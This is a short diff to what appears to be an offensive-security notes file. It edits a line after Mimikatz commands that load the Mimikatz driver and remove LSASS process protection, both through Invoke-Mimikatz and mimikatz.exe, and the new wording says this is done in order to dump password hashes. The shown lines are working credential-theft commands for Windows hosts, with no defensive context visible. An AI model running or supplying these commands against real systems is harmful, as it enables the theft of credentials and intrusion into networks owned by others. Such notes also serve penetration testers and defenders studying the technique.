@@ -22,5 +22,5 @@ Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
 .\mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "exit"
 ```
 
-Once LSASS protection is disabled we can use mimikatz as normal.
+Once LSASS protection is disabled we can use mimikatz as normal to dump hashes.
 
